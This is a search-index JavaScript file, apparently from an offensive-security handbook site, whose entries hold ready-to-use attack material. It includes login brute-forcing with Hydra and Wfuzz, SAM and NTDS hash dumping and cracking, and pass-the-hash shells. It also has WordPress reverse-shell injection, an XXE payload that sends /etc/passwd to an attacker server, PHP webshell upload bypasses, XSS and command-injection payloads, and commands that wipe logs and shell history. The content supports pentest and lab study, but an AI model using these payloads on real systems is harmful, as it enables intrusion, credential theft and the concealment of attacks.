\"/login:username=^USER^\u0026password=^PASS^:Invalid username\" # Cracking password hydra -l username -P passwords.txt vulnerable.com http-post-form \"/login:username=^USER^\u0026password=^PASS^:Invalid password\" # HTTPS (https-post-form) hydra -L usernames.txt -P passwords.txt vulnerable.com https-post-form \"/login:username=^USER^\u0026password=^PASS^:Username or password is incorrect\" # Cracking the Authorization or WWW-Authenticate in the request header. hydra -L usernames.txt -P passwords.txt http-get Using Wfuzz link # Cracking username wfuzz -z file,./usernames.txt -d \"username=FUZZ\u0026password=password\" -u https://example.com/login # Cracking password wfuzz -z file,./passwords.txt -d \"username=admin\u0026password=FUZZ\" -u https://example.com/login # Crack username/password wfuzz -z file,./usernames.txt -z file,./passwords.txt -d \"username=FUZZ\u0026password=FUZ2Z\" -u https://example.com/login # Range: 00-99 -\u003e \"password00\", \"password01\", ..., \"password99\" # -t: N threads # -s: N seconds per request wfuzz -z range,00-99 -d \"username=admin\u0026password=passwordFUZZ\u0026submit=Submit\" -X POST -u https://example.com/login -t 1 -s 20 # -- Options -------------------------------------------------------------------------------------------- # --hc: Hide the specific status code wfuzz -z file,./usernames.txt -d \"username=FUZZ\u0026password=password\" --hc 302 -u http://example.com/login # --hh: Hide the specific chars (Content-Length) wfuzz -z file,./passwords.txt -d \"username=admin\u0026password=FUZZ\" --hh 783 -u http://example.com/login # --sc: Show the specific statuc code wfuzz -z file,./usernames.txt -d \"username=FUZZ\u0026password=password\" --sc 302 -u http://example.com/login # --sh: Show the specific chars (Content-Length) wfuzz -z file,./passwords.txt -d \"username=admin\u0026password=FUZZ\" --sh 1214 -u http://example.com/login # --ss: Show specified string wfuzz -z file,./wordlist.txt -d \"username=admin\u0026password=FUZZ\" -u https://example.com/login --ss \"Login success\" # --hs: Hide specified string wfuzz -z file,./wordlist.txt -d \"username=admin\u0026password=FUZZ\" -u https://example.com/login --hs \"Login failed\" "
            }
        );
    index.add(
            {
                id:  59 ,
                href: "\/docs\/hdks\/windows\/privilege-escalation\/windows-privesc-with-registry-keys\/",
                title: "Windows PrivEsc with Registry Keys",
                description: "The Windows Registry is a hierarchical database that stores low-level settings for Windows and for applications that opt to use the registry. Registry keys are container objects, which contain values and subkeys. These similar to folders.",
                content: "Investigation linkFind interesting registry or values in registry keys.\n# HKLM: HKEY_LOCAL_MACHINE reg query HKLM reg query HKLM\\SAM reg query HKLM\\SAM\\SAM reg query HKLM\\SECURITY reg query HKLM\\SOFTWARE reg query HKLM\\SYSTEM # Find user credentials reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon # HKU: HKEY_USERS reg query HKU reg query HKU\\S-1-2-3 # HKCU: HKEY_CURRENT_USER reg query HKCU reg query HKCU\\System Reveal Password from Registry Hives linkA hive is a logical group of keys, subkeys, and values in the registry that has a set of supporting files loaded into memory when the operating system is started or a user logs in.\nIf we can access to registries and get registry hives, the password hashes can be dumped.\nCopy three hives (SAM, SECURITY, SYSTEM) to arbitrary direcotyr where we can access.\n# save: Saves a copy of specified subkeys, entries, and values of the registry in a specified file. # HKLM: HKEY_LOCAL_MACHINE reg save HKLM\\sam c:\\Users\\\\Desktop\\sam.save reg save HKLM\\security c:\\Users\\\\Desktop\\security.save reg save HKLM\\system c:\\Users\\\\Desktop\\system.save After that, we can dump password hashes from hives.\nimpacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL Crack Hashes linkAfter dumping hashes, we can crack them.\nFirst, we extract NTLM from the hash. For example, the dumped hash is below.\nAdministrator:500:abcdefghi...:zyxwvuts...::: We need only the right string zyxwvuts, so extract it to a text file as below.\necho -n \"zyxwvuts...\" \u003e hash.txt Now crack it using Hashcat or John The Ripper.\nSee more details here.\n# Hashcat # -m 1000: mode NTLM hashcat -m 1000 hash.txt wordlist.txt # John The Ripper john --format=nt --wordlist=wordlist.txt hash.txt If we get the password, we can use it for abusing the target machine.\nFor example, we can use it to WinRM as below.\nevil-winrm -i -u -p ShellBags linkA set of registry keys that store details about a viewed folder, such as its size, position, and icon.\nLocation link c:\\Users\\\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat If we cannot found AppData folder in Explorer, click View tab and check Hidden Items.\nAccess to Shellbag** link Search regedit on search bar and open Registry Editor\nGo to Computer\\HKEY_CLASSES_ROOT\\LocalSettings\\Software\\Microsoft\\Windows\\Shell\\Bags\nShellBags Explorer linkExtract ShellBags information.\nOpen ShellBags Explorer\nSelect File -\u003e Load offline hive\nNavigate to the UsrClass.dat and open the file\nFind suspicious folder and file\n"
            }
        );
    index.add(
            {
                id:  60 ,
                href: "\/docs\/hdks\/windows\/privilege-escalation\/windows-privesc-with-sebackupprivilege\/",
                title: "Windows PrivEsc with SeBackupPrivilege",
                description: "SeBackupPrivilege allows users to retrieve file contents.",
                content: "Investigation linkFirst check if the current user has SeBackupPrivilege in the privilege information.\nwhoami /all If so, we can read arbitrary files on the system include administrators files, SAML file, SYSTEM registry file, etc.\nExploitation (Read Sensitive Files) link1. Download \u0026 Upload Malicious DLLs linkIn local machine, download malicious dlls from here\n# If powershell, Invoke-WebRequest -Uri http://10.0.0.1:8000/SeBackupPrivilegeUtils.dll -OutFile .\\SeBackupPrivilegeUtils.dll Invoke-WebRequest -Uri http://10.0.0.1:8000/SeBackupPrivilegeCmdLets.dll -OutFile .\\SeBackupPrivilegeCmdLets.dll # If winrm, upload SeBackupPrivilegeUtils.dll upload SeBackupPrivilegeCmdLets.dll Import-Module .\\SeBackupPrivilegeUtils.dll Import-Module .\\SeBackupPrivilegeCmdLets.dll Set-SeBackupPrivilege Get-SeBackupPrivilege 2. Copy \u0026 Read Sensitive Files link Copy-FileSeBackupPrivilege C:\\Users\\Administrator\\flag.txt C:\\Users\\Public\\flag.txt -Overwrite Exploitation (Retrieve Registry Keys) link1. Create a Payload and Transfer It linkCreate diskshadow.txt in local machine. It referes to this.\nset metadata C:\\tmp\\tmp.cabs set context persistent nowriters add volume c: alias someAlias create expose %someAlias% h: Upload this file to remote machine.\n# If powershell, Invoke-WebRequest -Uri http://10.0.0.1:8000/diskshadow.txt -OutFile .\\diskshadow.txt # If winrm, upload diskshadow.txt 2. Execute DiskShadow.Exe linkThen execute diskshadow.exe.\n# /s: Specify the script file diskshadow.exe /s .\\diskshadow.txt 3. Upload Malicious DLL linkWe can download two dll files from here.\n# If powershell, Invoke-WebRequest -Uri http://10.0.0.1:8000/SeBackupPrivilegeUtils.dll -OutFile .\\SeBackupPrivilegeUtils.dll Invoke-WebRequest -Uri http://10.0.0.1:8000/SeBackupPrivilegeCmdLets.dll -OutFile .\\SeBackupPrivilegeCmdLets.dll # If winrm upload SeBackupPrivilegeUtils.dll upload SeBackupPrivilegeCmdLets.dll Import-Module .\\SeBackupPrivilegeUtils.dll Import-Module .\\SeBackupPrivilegeCmdLets.dll Copy-FileSeBackupPrivilege h:\\windows\\ntds\\ntds.dit c:\\tmp\\ntds.dit -overwrite reg save HKLM\\SYSTEM c:\\tmp\\system download ntds.dit download system 4. Dump Password Hashes linkNow we have two files (ntds.dit and system) in local machine.\nWe can dump password hashes using the files.\nimpacket-secretsdump -ntds ntds.dit -system system LOCAL After that, crack the hashes or use them for pass-the-hash.\n"
            }
        );
    index.add(
            {
                id:  61 ,
                href: "\/docs\/hdks\/web\/cms\/wordpress-pentesting\/",
                title: "WordPress Pentesting",
                description: "WordPress is a content management system.",
                content: "Enumeration link nmap --script http-wordpress-brute nmap --script http-wordpress-enum --script-args type=\"plugins\",search-limit=1500 -p 80 nmap --script http-wordpress-users -p 80 nmap --script http-wordpress-* -p 80 WpScan linkWpscan is a WordPress security scanner which can brute force credentials.\nwpscan --url http:// -P wordlist.txt # --rua: random user agent # --http-auth username:password # -e: enumerate # ap: All plugins # at: All themes # tt: Timthumbs # cb: Config backups # dbe: Db exports # u: User IDs range # m: Media IDs range wpscan --rua -e ap,at,tt,cb,dbe,u,m --url https://vulnerable.com -P /usr/share/wordlists/rockyou.txt # Specifify username (-U) wpscan --rua -e ap,at,tt,cb,dbe,u,m --url https://vulnerable.com -U username -P /usr/share/wordlists/rockyou.txt Version Detection linkThere is the meta tag for WordPress in the head tag of the HTML source code.\nCommon Directories link /author/admin/ /index.php/author/admin/ /license.txt /readme.html /robots.txt /wp-admin/ /wp-admin/admin-ajax.php /wp-admin/upload.php /wp-content/ /wp-content/uploads/ /wp-includes/ /wp-json/wp/v1/ /wp-json/wp/v2/ /wp-login.php # Users /?author=1 /?author=2 # Posts /?p=1 /?p=2 # Private/Draft Posts (WordPress \u003c= 5.2.3) /?static=1 Try to Login with Default Credential linkAccess to /wp-login.php and use the default credential in the login form.\nadmin:password Reverse Shell linkTo achieve reverse shell, we need the admin credential.\nMetasploit link msfconsole msf\u003e use exploit/unix/webapp/wp_admin_shell_upload msf\u003e set RHOSTS msf\u003e set LHOST msf\u003e set USERNAME admin msf\u003e set PASSWORD admin msf\u003e check msf\u003e run meterpreter\u003e shell PHP Reverse Shell Injection link Themes\nAccess to dashboard (/wp-admin/).\nMove to Appearance and select theme e.g. Twenty Seventeen.\nClick Theme Editor or Editor in the Appearance section.\nIn the theme editor, click 404 Template (404.php) on the right.\nCopy and paste the script for Reverse Shell here. For Windows, this payload is available.\nEdit \"$ip\" and \"$port\" to assign local machine ip and port in the script.\nIn your terminal, start netcat listener for getting the incoming connection from the website.\nnc -lvnp Access https://vulnerable.com/wp-content/themes/twentyseventeen/404.php\". We should get the target shell in the netcat listener.\nPlugins\nGo to Plugins  Plugin Editor Insert the PHP reverse shell code into the file (e.g. plugin_name.php) and update $ip and $port. Start netcat listener nc -lvnp 4444 in terminal. Then access to https://example.com/wp-content/plugins//.php We should get a shell. XML-RPC (xmlrpc.php) link Get All Methods\nPOST /xmlrpc.php HTTP/1.1 Host: vulnerable.com ... \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e system.listMethods Ping Back\nUse PostBin to confirm the results.\nPOST /xmlrpc.php HTTP/1.1 Host: vulnerable.com ... \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e pingback.ping https://www.toptal.com/developers/postbin/xxxxxxxxxxxxx-xxxxxxxxxxxxx http://vulnerable.com User Enumeration\nIts recommended to use Burp Intruder or Turbo Intruder for brute forcing username/password.\nPOST /xmlrpc.php HTTP/1.1 Host: vulnerable.com ... \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e wp.getUsersBlogs {username} {password} XXE (CVE-2021-29447) linkIf you have a normal user credential, upload the exploitable media (.WAV) with XXE and reveal sensitive information.\nFirst off, create exploit.wav.\necho -en 'RIFF\\xb8\\x00\\x00\\x00WAVEiXML\\x7b\\x00\\x00\\x00\u003c?xml version=\"1.0\"?\u003e\u003c!DOCTYPE ANY[\u003c!ENTITY % remote SYSTEM '\"'\"'http://:9001/exploit.dtd'\"'\"'\u003e%remote;%init;%trick;] \u003e\\x00'\u003e exploit.wav Next create exploit.dtd.\n\u003c!ENTITY % file SYSTEM \"php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd\"\u003e \u003c!ENTITY % init \"\u003c!ENTITY \u0026#x25; trick SYSTEM 'http://:9001/?p=%file;'\u003e\"\u003e Then start PHP server in local machine.\nphp -S 0.0.0.0:9001 In target website, login as normal user and go to Media, click Add New.\nUpload the exploit.wav.\nAfter that, open the WAV file. You should see the information is revealed in your console.\nDecode Base64 linkTo decode the Base64, create decode.php as following.\n\u003c?php echo zlib_decode(base64_decode('')); ?\u003e Execute the script to decode it.\nphp decode.php SSRF linkoEmbed Proxy link /wp-json/oembed/1.0/proxy?url=http://10.0.0.1/ "
            }
        );
    index.add(
            {
                id:  62 ,
                href: "\/docs\/hdks\/web\/tool\/burp-suite-troubleshooting\/",
                title: "Burp Suite Troubleshooting",
                description: "This article might be able to fix the problems of Burp Suite.",
                content: "Fix Error Failed to connect to x.x.x.x:443 linkIf we try to HTTP access rather than HTTPS, This error occurs because the Burps embedded browser uses secure connections automatically by default.\nIf we got the error, we may be able to solve the problem by the following methods:\nIn the embedded browser, open Settings by clicking on three dots menu icon. Once Settings screen opens, go to Privacy and security  Security. In Advanced section, uncheck Always use secure connections then close the Settings. Enter the desired URL including http://. If all goes well, we may be able to access it. "
            }
        );
    index.add(
            {
                id:  63 ,
                href: "\/docs\/hdks\/linux\/archive\/crack-7z-password\/",
                title: "Crack 7z Password",
                description: "Crack link 7z2john example.7z \u003e hash.txt # or /usr/share/john/7z2john.pl example.7z \u003e hash.txt john --wordlist=wordlist.txt hash.txt If we got the error Can't locate Compress/Raw/Lzma.pm in @INC, we need to install libcompress-raw-lzma-perl package so try: sudo apt install libcompress-raw-lzma-perl ",
                content: "Crack link 7z2john example.7z \u003e hash.txt # or /usr/share/john/7z2john.pl example.7z \u003e hash.txt john --wordlist=wordlist.txt hash.txt If we got the error Can't locate Compress/Raw/Lzma.pm in @INC, we need to install libcompress-raw-lzma-perl package so try:\nsudo apt install libcompress-raw-lzma-perl "
            }
        );
    index.add(
            {
                id:  64 ,
                href: "\/docs\/hdks\/web\/security-risk\/xss\/",
                title: "XSS (Cross-Site Scripting)",
                description: "XSS enables attackers to injection client-side scripts into web applications.",
                content: " Payloads linkWe can insert them into URL params, POST params or HTTP headers.\nAdditionary, we can also find CVE related XSS here.\nScript Tags link \"\u003e \"\u003e '\u003e %3Cscript%3Ealert%281%29%3C%2Fscript%3E ';alert(1);' In addition, we may be able to execute our JavaScript file which is hosted on our server.\nImg Tags link \" src=1 onerror=alert(1)\u003e \u003c\u003e \"\u003e \"\u003e SVG Tags link \"\u003e Click me Input Tags link Select Tags link Anchor Tags link click Click Iframe Tags link Body Tags link HTML Entity linkReference: https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#img-onerror-and-javascript-alert-encode\nOthers link \" onmouseleave='alert(1)'\"\u003e javascript:alert(1) \\\"-alert(1)// /?q=\u0026subparam=--\u003e /index.php#value='\u003e To find tags, events and payloads for XSS, we can see Port Swiggers XSS Cheat Sheet.\nPayloads - JQuery link https://example.com/# Payloads - AngularJS linkIf you find , or in the HTML source code, you may be able to abuse it by XSS.\nhttps://example.com/?search={{$eval.constructor('alert(1)')()}} https://example.com/?search={{$on.constructor('alert(1)')()}} To perform XSS without $eval function and quotes, we might be able to take another approach.\nThis PortSwiggers lab provides the following payload. But sorry, I dont understand how it works at the moment.\n# toString() : Create a string without quotes. # toString().constructor.prototype.charAt=[].join : Override `charAt` function for all strings with `[].join`. # [1]|orderBy:toString().constructor.fromCharCode(...) : Pass an array to the `orderBy` filter. # 120,61,97,108,101,114,116,40,49,41 : It means `x=alert(1)` in decimal. https://example.com/?q=1\u0026toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1 AngularJS and CSP (Content Security Policy) linkReference: PortSwiggers lab\nIf the website uses AngularJS with CSP (ng-csp) as below,\nWe need to bypass them by using a focus event (ng-focus),\n/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x'; Polyglot XSS link jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//"
            }
        );
    index.add(
            {
                id:  65 ,
                href: "\/docs\/hdks\/linux\/post-exploitation\/cover-your-tracks-in-linux\/",
                title: "Cover Your Tracks in Linux",
                description: "After exploitation in Linux system, attackers want to erase their activities and be undetectable.",
                content: "Clear History link unset HISTORY echo '' \u003e ~/.bash_history echo '' \u003e /root/.bash_history history -c export HISTSIZE=0 unset HISTFILE Clear Logs link # Shrink the size of log files with `truncate -s 0` truncate -s 0 /var/log/auth.log echo '' \u003e /var/log/auth.log cat /dev/null \u003e /var/log/auth.log \u003e /var/log/auth.log dd if=/dev/null of=/var/log/auth.log shred /var/log/auth.log "
            }
        );
    index.add(
            {
                id:  66 ,
                href: "\/docs\/hdks\/web\/security-risk\/broken-access-control\/",
                title: "Broken Access Control",
                description: "The attacking methodology of broken access control in web applications. If we got 401 or 403 HTTP response, try to bypass it using the following methods in this post.",
                content: "Change Header Values linkCookie linkWe may be able to get access to the login-required pages.\nCookie: admin=true Cookie: isAdmin=true Cookie: access=1 Cookie: access=true # Insert another user value Cookie: session= Cookie: access_token= IP Spoofing link Cluster-Client-IP: 127.0.0.1 Forwarded-For: 127.0.0.1 X-Forwarded: 127.0.0.1 X-Forwarded-For: 127.0.0.1 X-Original-URL: 127.0.0.1 X-Originating-IP: 127.0.0.1 X-ProxyUser-IP: 127.0.0.1 X-Remote-Addr: 127.0.0.1 X-Remote-IP: 127.0.0.1 Host: 127.0.0.1 User Agent linkSometimes we can access another server by replacing the User Agent with the specific one.\nUser-Agent: Change Methods link GET, POST, PUT, DELETE, HEAD, TRACE, OPTIONS, PATCH, INVENTED, CONNECT, etc. # Override to bypass FireWall (via POST /example HTTP/1.1) X-Method-Override: PUT X-HTTP-Method-Override: PUT POST Parameters link POST / HTTP/1.1 ... { \"email\": \"new-email@example.com\", \"isAdmin\": true } X-Original-URL, X-Rewrite-URL link POST / HTTP/1.1 ... X-Original-URL: /admin/deleteuser # or X-Rewrite-URL: /admin/deleteuser ... username=michael GET Parameters link https://vulnerable.com/account?id=michael https://vulnerable.com/account?id=admin https://vulnerable.com/account?id=administrator # GUID cannot be guessed but it may be found somewhere in the website. https://vulnerable.com/account?id=7230b2a9-60de-4409-a350-cd14986a8d3e https://vulnerable.com/account?id=1de655cb-29d7-4008-b434-e688b39f9564 Access Page via SSRF linkIf there is another website that is owned by same orginazation, we may be able to see the target website with SSRF.\nhttps://example.com?url=https://admin.example.com/ "
            }
        );
    index.add(
            {
                id:  67 ,
                href: "\/docs\/hdks\/web\/method\/bypass-client-server-side-filter\/",
                title: "Bypass Client/Server Side Filter",
                description: "If the website uses a filter for validation, we might be able to bypass it by disabling the filter. We can easily do that with Burp Suite's Intercept.",
                content: "1. Disable Filter linkDisable Client-Side (JS) Filter link In Burp Suite, go to Proxy tab and click Options. Navigate to Intercept Client Requests section, then click on the top line (File extension) then click Edit. The popup will open. In the popup, find and remove |^js$ in Match condition, then save the filter. Disable Server-Side Filter link In Burp Suite, go to Proxy tab and click Options. Navigate to Intercept Server Requests section and check Intercept responses based on. 2. Drop Filter linkAfter setting up as above, we might be able to bypass filter by intercepting requests and drop the filter as the following actions.\nTurn the intercept on. On browser, press Ctrl+F5 (hard refresh) to reload the page. If you found the filtering file (.js), drop it. "
            }
        );
    index.add(
            {
                id:  68 ,
                href: "\/docs\/hdks\/windows\/technique\/download-files-in-windows\/",
                title: "Download Files in Windows",
                description: "We can download files from websites in Windows from command line, like wget command of Linux.",
                content: "Using Invoke-WebRequest linkWe can use Invoke-WebRequest command\n# In PowerShell Invoke-WebRequest -Uri https://example.com/hello.txt -Outfile .\\hello.txt IWR -Uri https://example.com/hello.txt -Outfile .\\hello.txt # In CMD, we need to call `powershell` or `powershell.exe` command. powershell Invoke-WebRequest -Uri https://example.com/hello.txt -Outfile .\\hello.txt powershlel IWR -Uri https://example.com/hello.txt -Outfile .\\hello.txt "
            }
        );
    index.add(
            {
                id:  69 ,
                href: "\/docs\/hdks\/linux\/management\/file-transfer-in-linux\/",
                title: "File Transfer in Linux",
                description: "Using Wget linkIn machine A, Start a web server. python -m http.server # We can specify which directory to host by `--directory` option. python -m http.server --directory /usr/bin In machine B, download a file from the web server of machine A. wget http://:8000/example.txt # Download recursively # -r: recursive # -np: no parent # Don't forget \"/\" after the directory name wget -r -np http:///somedir/ Using Netcat linkTransfer a File linkIn machine A, start a listener for receiving a file.",
                content: "Using Wget linkIn machine A, Start a web server.\npython -m http.server # We can specify which directory to host by `--directory` option. python -m http.server --directory /usr/bin In machine B, download a file from the web server of machine A.\nwget http://:8000/example.txt # Download recursively # -r: recursive # -np: no parent # Don't forget \"/\" after the directory name wget -r -np http:///somedir/ Using Netcat linkTransfer a File linkIn machine A, start a listener for receiving a file.\n# -l: Listen mode # -p: Port nc -lp 4444 \u003e example.txt In machine B, send a file to machine A.\nnc 4444 \u003c example.txt Transfer a Directory linkIn machine A, start a listener for receiving a directory.\nnc -lvnp 4444 \u003e out.tar In machine B, compress a directory using tar and transfer it.\ntar -cf - example/ | nc 4444 In machine A, decompress the tar file and get the directory.\ntar -xf out.tar Using Base64 linkIn machine A, encode a file with base64 and copy the encoded Base64 string.\n# -w 0: disabe line wrapping base64 exploit.sh -w 0 In machine B, paste the encoded Base64 string.\necho '123...def==' | base64 -d \u003e exploit.sh "
            }
        );
    index.add(
            {
                id:  70 ,
                href: "\/docs\/hdks\/web\/security-risk\/file-upload-attack\/",
                title: "File Upload Attack",
                description: "It is often used for gaining access to the target shell using Reverse Shell, or getting sensitive information using Remote Code Execution (RCE).",
                content: "Check Allowed File Formats linkFirst off, we need to know what file types are allowed to be uploaded in target website.\nTry to upload any formats.\n.php, .php3, .php4, .php5, .phtml, .phar .jpg, jpeg, .png, .gif .bmp .pdf .js .exe, .dll, .asp, .aspx .py .go .rs Create Blank Files for Each Format linkTo create a blank file for the checking purpose, execute the following command.\njpg, png # https://superuser.com/questions/294943/is-there-a-utility-to-create-blank-images convert -size 32x32 xc:white test.jpg convert -size 32x32 xc:white test.png pdf # https://unix.stackexchange.com/questions/277892/how-do-i-create-a-blank-pdf-from-the-command-line convert xc:none -page Letter a.pdf Bypass File Extension Validation linkWe might be able to bypass file extension validation by modifying the filename.\nFor example, if we cannot upload a pure .php file extension, tweak the filename a bit as below.\nexploit.php exploit.php3 exploit.php4 exploit.php5 exploit.phtml exploit.phar exploit.jpg.php exploit.jpeg.php exploit.png.php exploit.gif.php exploit.pdf.php exploit.php. exploit.php.jpg exploit.php.jpeg exploit.php.png exploit%2Ephp exploit.p.phphp exploit.php%00.jpg exploit.php%0d%0a.jpg exploit.PHP exploit.pHp exploit.php/ exploit.php// exploit.php\\ exploit.php# exploit..php Bypass Content-Type Validation linkWe might be able to bypass the content type validation by modifying that.\nFor example, assume that we want to upload PHP file to execute webshell or reverse shell, but PHP files are rejected by the website.\nIn this situation, we might be able to bypass the validation by modifying the Content-Type from application/x-php to other types such as image/jpeg, plain/text etc.\nHere is the example.\n------abcdefghijk Content-Disposition: form-data; name=\"avatar\"; filename=\"exploit.php\" Content-Type: image/jpeg \u003c?php echo system($_GET['cmd']); ?\u003e ------abcdefghijk Change Upload Location by Filename linkWe might be able to upload our file to unintended location by path traversing with filename e.g. ../example.php or ..%2Fexample.php.\n------abcdefghijk Content-Disposition: form-data; name=\"avatar\"; filename=\"..%2fexploit.php\" Content-Type: application/x-php \u003c?php echo system($_GET['cmd']); ?\u003e ------abcdefghijk Overwrite Server Configuration linkWe might be able to overwrite the web server configuration file such as \".htaccess\", \".htpasswd\" by specifying the filename to the name of the config file and write desired contents of that.\n------abcdefghijk Content-Disposition: form-data; name=\"avatar\"; filename=\".htaccess\" Content-Type: text/plain AddType application/x-httpd-php .abc ------abcdefghijk Magic Bytes linkReference: Wikipedia\nIf the website checks the magic byte of the uploaded file for allowing only image files to be uploaded, we might be able to bypass this validation by adding magic bytes before the actual payload.\nThe exif_imagetype() PHP function is likely to be used for such validation.\nIn addition, we may need to change other values such as Content-Type depending on the situation.\nPNG link Hex Signature ISO 8859-1 89 50 4E 47 0D 0A 1A 0A PNG Payload example:\nPNG \u003c?php echo system($_GET['cmd']); ?\u003e JPG/JPEG link Hex Signature ISO 8859-1 FF D8 FF EE  FF D8 FF E0  FF D8 FF E0 00 10 4A 46 49 46 00 01 JFIF Payload example:\n \u003c?php echo system($_GET['cmd']); ?\u003e // or  \u003c?php echo system($_GET['cmd']); ?\u003e // or JFIF \u003c?php echo system($_GET['cmd']); ?\u003e PDF link Hex Signature ISO 8859-1 25 50 44 46 2D %PDF- Payload example:\n%PDF- \u003c?php echo system($_GET['cmd']); ?\u003e GIF linkReference: Web Design in a Nutshell\nGIF87a: The original format for indexed color images. It uses LZW compression and has the option of being interlaced. GIF89a: Is the same as GIF87a but also includes transparancy and animation capabilities. Hex Signature ISO 8859-1 47 49 46 38 37 61 GIF87a 47 49 46 38 39 61 GIF89a Payload example:\nGIF87a \u003c?php echo system($_GET['cmd']); ?\u003e // or GIF89a \u003c?php echo system($_GET['cmd']); ?\u003e RIFF WAVE link Hex Signature ISO 8859-1 52 49 46 46 ?? ?? ?? ?? 57 41 56 45 RIFF????WAVE Payload example:\nRIFF????WAVE \u003c?php echo system($_GET['cmd']); ?\u003e Zip linkIf target website restricts uploads to zip files only, the website (server) may unzip uploaded files internally and displays the result of decompressed file somewhere e.g. /upload/example.txt.\nZip Slip linkCreate a file containing ../ in the filename, and compress this file.\necho '\u003c?php echo system(\"id\");?\u003e' \u003e '../test.php' zip test.zip '../test.php' After uploading the zip file, target website (server) will decompress this file and may store the test.php file into unexpected directory.\nLFI with Symlinks linkIn local machine, create a symbolic link for a sensitive file. Then compress the symlink with zip.\nln -s /etc/passwd passwd.txt zip --symlink test.zip passwd.txt When we upload the zip file to target website, the website decompress the zip file and may display the file of the symbolic link (/etc/passwd, etc.). In short, we may be able to see the contents of the sensitive file.\nJPEG Polyglot XSS linkReference: https://infosecwriteups.com/exploiting-xss-with-javascript-jpeg-polyglot-4cff06f8201a\nWe may be able to inject XSS by inserting arbitrary JavaScript code into a JPEG file.\nWe can generate automatically a polyglot JPEG with imgjs_polygloter.\nBelow is the manual exploitation flow.\n1. Prepare JPEG Image linkHere we create a blank JPEG image using convert command.\nconvert -size 100x100 xc:white evil.jpg # Backup for reproduction cp evil.jpg evil_original.jpg 2. Create XSS Payload in Hex linkWe will insert the following JavaScript code.\n*/=alert(\"test\");/* To insert it into JPEG file, we need to convert this to HEX as below:\n2A 2F 3D 61 6C 65 72 74 28 22 74 65 73 74 22 29 3B 2F 2A 3. Start Hex Editor linkStart Hex editor to modify our evil.jpg. We use ghex here but you can use your favorite HEX editor.\nghex evil.jpg The original hex representation of the evil.jpg is as such follow:\nFF D8 FF E0 00 10 4A 46 49 46 00 01 01 01 00 48 00 ... # Details of the Hex # FF D8: Start of image # FF E0: Application default header # 00 10: The length of the JPEG header (`00 10` represents 16 bytes) 4. Insert Our JavaScript into JPEG File linkNow start inserting our payload.\nFirst we replace 00 10 after FF D8 FF E0 with our 2F 2A (/*).\nFF D8 FF E0 2F 2A 4A 46 49 46 00 01 01 01 00 48 00 ... By this, the length of the JPEG header is 12074 bytes (0x2F2A in decimal).\nSince the size of our payload is 19 bytes as below:\npython3 \u003e\u003e\u003e payload = b'*/=alert(\"test\");/*' \u003e\u003e\u003e len(payload) 19 We need to pad out the remaining 12042 bytes (12074 - 16 - 19) with nulls.\nBelow is the Python code example to generate a polyglot JPEG file, which refers to https://github.com/simplylu/jpeg_polyglot_xss/blob/main/exploit.py.\npayload = b'*/=alert(\"test\");/*' input_file = 'evil_original.jpg' output_file = 'evil.jpg' a = open(input_file, 'rb').read() # Get the length of the header header_size = int(a.hex()[8:12], 16) new_header_size = int(payload.hex()[2:4]+payload.hex()[:2], 16) # Calculate the size of nulls for padding null_size = new_header_size - header_size - 16 # Get start and end start = a[:40] end = a.hex()[40:] end = bytearray([int(end[i:i+2], 16) for i in range(0, len(end), 2)]) res = start + (null_size * b'\\x00') + payload + end with open(output_file, 'wb') as f: f.write(res) 5. XSS with this JPEG linkInject XSS to make our JPEG to execute JavaScript code. We need to set charset to ISO-8859-1 for executing that.\n.jpg \"\u003e.jpg SSTI link {{2*3}}.jpg {2*3}.jpg 2*3.jpg 2*3}}.jpg 2*3}.jpg ${2*3}.jpg \"{{2*3}}.jpg Truncation link xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxtest.jpg test.jpgxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx HTML Injection linkTry to upload the file which includes HTML tags in the filename. It may affect the web page.\ntest.jpg \"\u003e.jpg \"\u003e"
            }
        );
    index.add(
            {
                id:  71 ,
                href: "\/docs\/hdks\/windows\/privilege-escalation\/login-windows-shell\/",
                title: "Login Windows Shell",
                description: "If we have credentials for target Windows system, we can execute commands from Linux machine.",
                content: "Impacket PsExec linkPsExec gives us an interactive shell on the Windows host.\nimpacket-psexec username:password@ # Pass the Hashes impacket-psexec -hashes abcdef0123456789abcdef0123456789:c2597747aa5e43022a3a3049a3c3b09d username@10.0.0.1 Impacket WmiExec linkWmiExec uses Windows Management Instrumentation (WMI) to give us an interactive shell on the Windows host.\nimpacket-wmiexec example.local/username@10.0.0.1 # Pass the Hashes impacket-wmiexec -hashes abcdef0123456789abcdef0123456789:c2597747aa5e43022a3a3049a3c3b09d example.local/username@10.0.0.1 "
            }
        );
    index.add(
            {
                id:  72 ,
                href: "\/docs\/hdks\/web\/security-risk\/os-command-injection\/",
                title: "OS Command Injection",
                description: "Basic Payloads linkIf the payload includes whitespaces ( ), we need to change it to + or URL encoding (%20). /api/cmd/whoami /command/whoami /?cmd=whoami /?cmd=;id /?cmd=ls /?cmd=ls .. /?cmd=ls ../ /?cmd=ls /home /?cmd=`ping -c 1 10.0.0.1` /?file=example.txt; echo $(ls -al /) /?file=example.txt; echo $(ls -al /) | /?q=;system($_GET[cmd])\u0026cmd=whoami /?q=${system($_GET[cmd])}\u0026cmd=whoami /?productId=1\u0026stockId=1|whoami /?productId=1\u0026stockId=1|id /?file=example.txt | systeminfo # /?file=example.txt ; systeminfo # /?file=example.txt') ; systeminfo # URL Encoding linkWe may be able to bypass specific character filter by encoding them.",
